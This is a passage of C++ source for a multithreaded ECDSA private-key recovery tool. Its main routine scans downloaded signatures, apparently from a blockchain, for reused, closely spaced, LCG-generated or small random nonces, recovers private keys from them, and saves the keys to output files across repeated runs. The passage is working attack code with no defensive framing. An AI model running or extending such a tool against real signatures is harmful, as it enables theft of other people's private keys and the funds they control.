        else if(k=="--lcg-per-pair-cap"){ if(!needi(A.lcg_per_pair_cap)) return false; }
        else if(k=="--no-lcg"){ A.lcg_enable=false; }
        else if(k=="--scan-random-k"){ if(!needu(A.scan_random_k)) return false; }
        else if(k=="--scan-random-k-top"){ if(!needu(A.scan_random_k_top)) return false; }
        else if(k=="--scan-random-k-range"){ if(!needu(A.scan_random_k_range)) return false; }
        else if(k=="--rand-seed"){ if(!needu(A.rand_seed)) return false; }
        else { usage(); return false; }
    }
    if(A.dg_seeds.empty()) A.dg_seeds={1,2,4,8,16,32,64,128,256,512,1024};
    if(A.step_seeds.empty()) A.step_seeds={3,5,7,9,17};
    return true;
}
static void build_delta_schedules(const Args& A, vector<uint64_t>& gradient, vector<uint64_t>& step_sched){
    vector<uint64_t> seeds=A.dg_seeds;
    vector<uint64_t> fill;
    for(uint64_t d=1; d<=A.dg_max_delta; d+=max(1,A.dg_fill_step)) fill.push_back(d);
    auto uniq=[&](vector<uint64_t>& v){
        sort(v.begin(), v.end());
        v.erase(unique(v.begin(), v.end()), v.end());
        v.erase(remove_if(v.begin(), v.end(), [&](uint64_t x){return x==0 || x>A.dg_max_delta;}), v.end());
    };
    gradient=seeds; gradient.insert(gradient.end(), fill.begin(), fill.end()); uniq(gradient);
    for(uint64_t base: A.step_seeds){
        if(base==0) continue;
        for(uint64_t t=1;;++t){
            __int128 val=(__int128)base*(__int128)t;
            if(val > (__int128)A.dg_max_delta) break;
            step_sched.push_back((uint64_t)val);
        }
    }
    uniq(step_sched);
}

// ------------------------------- Main -------------------------------
int main(int argc, char** argv){
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    Args A;
    if(!parse_args(argc,argv,A)) return 1;

    // Preserve prior recovery output across reruns and avoid re-emitting the same key pairs.
    GOUT.preload_existing(A.out_json);
    if(!A.preload_recovered.empty() && A.preload_recovered != A.out_json){
        GOUT.preload_existing(A.preload_recovered);
    }

    // Pass0: bucketize + dedup
    string tmpdir = string("/tmp/ecdsa_strict_") + to_string(::getpid());
    std::error_code ec2; fs::create_directories(tmpdir, ec2);
    if (ec2) cerr << "[warn] create_directories(pass0): " << ec2.message() << "\n";
    vector<string> buckets;
    pass0_bucketize_and_dedup(A.sigs, tmpdir, A.bucket_mode, buckets);
    cerr<<"[pass0] bucket_mode="<<A.bucket_mode<<" buckets="<<buckets.size()<<"\n";
    size_t cross_pub_collision_groups = write_dup_reports(buckets, A.report_collisions, A.export_clusters);
    cerr<<"[pass0-reports] cross_pub_collision_groups="<<cross_pub_collision_groups
        <<" collisions_out="<<A.report_collisions
        <<" clusters_out="<<A.export_clusters<<"\n";

    RecStore store;

    // Reuse local recovery artifacts as seed material on later runs. This keeps
    // recovered knowledge active for newly downloaded signatures without
    // re-emitting duplicate key rows.
    {
        Secp secp;
        if(!A.preload_recovered.empty() && A.preload_recovered != A.out_json){
            size_t seeded_external = load_recovered_keys_into_store(A.preload_recovered, store, secp.ctx);
            if(seeded_external > 0){
                cerr << "[preload-recovered] priv_keys_seeded=" << seeded_external
                     << " from=" << A.preload_recovered << "\n";
            }
        }
        size_t seeded_privs = load_recovered_keys_into_store(A.out_json, store, secp.ctx);
        if(seeded_privs > 0){
            cerr << "[preload-recovered] priv_keys_seeded=" << seeded_privs
                 << " from=" << A.out_json << "\n";
        }
    }
    if(!A.out_k.empty()){
        load_k_jsonl_into_store(A.out_k, store);
        ifstream fk(A.out_k);
        if(fk.good()){
            cerr << "[preload-recovered-k] loaded_existing_k_candidates from=" << A.out_k << "\n";
        }
    }

    // preload from known privs
    if(!A.preload_priv.empty()){
        std::string seed_outk = A.out_k.empty() ? std::string("recovered_k_from_priv.jsonl") : A.out_k;
        Secp secp; // context for pub derivation
        size_t seeded = seed_from_known_privs(A.sigs, A.preload_priv, seed_outk, A.out_json, A.out_txt, secp.ctx);
        std::cerr << "[preload-priv] r-buckets seeded from known privs: " << seeded 
                  << " -> " << seed_outk << std::endl;
        // load into RAM store too
        load_k_jsonl_into_store(seed_outk, store);
        if(A.preload_k.empty()) A.preload_k = seed_outk;
    }

    if(!A.preload_k.empty()){
        load_k_jsonl_into_store(A.preload_k, store);
    }

    // Build δ schedules
    vector<uint64_t> gradient, step_sched;
    build_delta_schedules(A, gradient, step_sched);

    atomic<size_t> bi{0};
    size_t total_pairs_tested=0, total_dupR=0, total_delta=0, total_delta_nopub=0, total_lcg=0, total_random_k=0;
    mutex dirty_m, stat_m;
    unordered_set<string> dirty_buckets;

    auto process_one_bucket = [&](int){
        Ctx C;
        Secp Slocal;
        size_t pairs_tested=0, f_dup=0, f_delta=0, f_delta_nopub=0, f_lcg=0;

        for(;;){
            size_t i = bi.fetch_add(1);
            if(i>=buckets.size()) break;
            const string& path=buckets[i];
            vector<Row> rows; rows.reserve(1<<15);
            load_bucket_rows_precompute(path, rows);
            if(rows.empty()) continue;

            f_dup   = try_primary_dupR(C, Slocal, rows, store, A.out_json, A.out_txt, A.out_k, pairs_tested);
            f_delta = delta_scan_bucket(C, Slocal, rows, gradient, step_sched, false, A.dg_per_pair_cap, store, A.out_json, A.out_txt, A.out_deltas, pairs_tested);
            // Fallback path for buckets containing signatures without pubkey field.
            // This avoids losing potentially useful relations in script forms where pub is absent.
            bool has_empty_pub = false;
            for(const auto& rw : rows){
                if(rw.pub.empty()){ has_empty_pub = true; break; }
            }
            if(has_empty_pub){
                int nopub_cap = max(128, A.dg_per_pair_cap / 2);
                f_delta_nopub = delta_scan_bucket(C, Slocal, rows, gradient, step_sched, true, nopub_cap,
                                                  store, A.out_json, A.out_txt, A.out_deltas, pairs_tested);
            } else {
                f_delta_nopub = 0;
            }

            // optional LCG (same-pub pairs)
            if(A.lcg_enable && (A.lcg_a_max>0 || A.lcg_b_max>0)){
                f_lcg = lcg_scan_bucket(C, Slocal, rows, A.lcg_a_max, A.lcg_b_max, A.lcg_per_pair_cap,
                                        store, A.out_json, A.out_txt, A.out_deltas, pairs_tested);
            } else f_lcg = 0;

            bool has_preloaded_seed = false;
            for(const auto& rw : rows){
                if(!rw.pub.empty()){
                    string priv;
                    if(store.get_priv_pub(rw.pub, priv)){
                        has_preloaded_seed = true;
                        break;
                    }
                }
                vector<string> ks;
                if(store.get_kset(rw.r_hex, ks) && !ks.empty()){
                    has_preloaded_seed = true;
                    break;
                }
            }

            if(f_dup+f_delta+f_delta_nopub+f_lcg>0 || has_preloaded_seed){
                lock_guard<mutex> lk(dirty_m);
                dirty_buckets.insert(path);
            }
            {
                lock_guard<mutex> lk(stat_m);
                total_pairs_tested += pairs_tested;
                total_dupR += f_dup;
                total_delta += f_delta;
                total_delta_nopub += f_delta_nopub;
                total_lcg += f_lcg;
            }
            log_line(
                string("[bucket ") + fs::path(path).filename().string() + "] rows=" + to_string(rows.size()) +
                " dupR=" + to_string(f_dup) +
                " delta=" + to_string(f_delta) +
                " delta_nopub=" + to_string(f_delta_nopub) +
                " lcg=" + to_string(f_lcg) +
                " preload_seed=" + string(has_preloaded_seed ? "1" : "0") +
                " pairs_tested=" + to_string(pairs_tested)
            );
            pairs_tested=0; // reset local count for the next bucket
        }
    };
    {
        vector<thread> pool;
        for(int t=0;t<A.threads;t++) pool.emplace_back(process_one_bucket,t);
        for(auto& th: pool) th.join();
    }

    // Random-k scan (optional)
    if(A.scan_random_k>0){
        cerr<<"[random-k] per-bucket="<<A.scan_random_k<<" bits="<<A.scan_random_k_range<<" seed="<<A.rand_seed<<"\n";
        atomic<size_t> ri{0};
        mutex rk_stat_m;
        auto rk_worker = [&](int tid){
            for(;;){
                size_t i=ri.fetch_add(1);
                if(i>=buckets.size()) break;
                vector<Row> rows; Ctx C;
                load_bucket_rows_precompute(buckets[i], rows);
                unordered_set<string> unique_r_in_bucket;
                unique_r_in_bucket.reserve(rows.size());
                for(const auto& rw : rows) unique_r_in_bucket.insert(rw.r_hex);
                uint64_t attempts_per_r = 0;
                if(!unique_r_in_bucket.empty()){
                    attempts_per_r = max<uint64_t>(
                        1,
                        A.scan_random_k / max<uint64_t>(1, unique_r_in_bucket.size())
                    );
                    log_line(
                        string("[random-k budget ") + fs::path(buckets[i]).filename().string() +
                        "] rows=" + to_string(rows.size()) +
                        " unique_r=" + to_string(unique_r_in_bucket.size()) +
                        " attempts_per_r=" + to_string(attempts_per_r) +
                        " bucket_budget=" + to_string(A.scan_random_k)
                    );
                }
                int hits = randk_scan_bucket(
                    C,
                    rows,
                    store,
                    A.out_json,
                    A.out_txt,
                    A.scan_random_k,
                    A.scan_random_k_range,
                    A.rand_seed+tid*1337,
                    1
                );
                if(hits > 0){
                    {
                        lock_guard<mutex> lk(dirty_m);
                        dirty_buckets.insert(buckets[i]);
                    }
                    {
                        lock_guard<mutex> lk(rk_stat_m);
                        total_random_k += hits;
                    }
                    log_line(
                        string("[random-k bucket ") + fs::path(buckets[i]).filename().string() +
                        "] hits=" + to_string(hits)
                    );
                }
            }
        };
        vector<thread> rkpool;
        for(int t=0;t<A.threads;t++) rkpool.emplace_back(rk_worker,t);
        for(auto& th: rkpool) th.join();
    }

    // Propagation rounds
    for(int it=1; it<=A.max_iter; ++it){
        if(dirty_buckets.empty()){ cerr<<"[iter "<<it<<"] nothing dirty\n"; break; }
        cerr<<"[iter "<<it<<"] dirty="<<dirty_buckets.size()<<"\n";
        vector<string> todo(dirty_buckets.begin(), dirty_buckets.end());
        dirty_buckets.clear();

        atomic<size_t> pi{0};
        mutex mk; int grew_k_sum=0, grew_d_sum=0;

        auto prop_worker = [&](int){
            Ctx C; Secp Ss;
            size_t dummy_pairs=0;
            for(;;){
                size_t i=pi.fetch_add(1);
                if(i>=todo.size()) break;
                vector<Row> rows; load_bucket_rows_precompute(todo[i], rows);
                auto pr = propagate_on_bucket(C, Ss, rows, store, A.out_json, A.out_txt, dummy_pairs);
                if(pr.first>0 || pr.second>0){
                    lock_guard<mutex> lk(mk);
                    grew_k_sum += pr.first; grew_d_sum += pr.second;
                    dirty_buckets.insert(todo[i]);
                }
            }
        };
        vector<thread> ppool;
        for(int t=0;t<A.threads;t++) ppool.emplace_back(prop_worker,t);
        for(auto& th: ppool) th.join();

        cerr<<"[iter "<<it<<"] grew_k="<<grew_k_sum<<", grew_keys="<<grew_d_sum<<"\n";
        if(grew_k_sum==0 && grew_d_sum==0) break;
    }

    size_t flushed_k_rows = flush_k_snapshot(A.out_k, store);
    if(flushed_k_rows > 0){
        cerr<<"[out-k] snapshot_rows="<<flushed_k_rows<<" path="<<A.out_k<<"\n";
    }

    // cleanup
    std::error_code ec3; fs::remove_all(tmpdir, ec3);
    if (ec3) cerr << "[warn] remove_all " << tmpdir << ": " << ec3.message() << "\n";

    cerr<<"[stats] dupR_hits="<<total_dupR
        <<" delta_hits="<<total_delta
        <<" delta_nopub_hits="<<total_delta_nopub
        <<" lcg_hits="<<total_lcg
        <<" random_k_hits="<<total_random_k
        <<" pairs_tested="<<total_pairs_tested<<"\n";
    cerr<<"Done.\n";
    return 0;
}
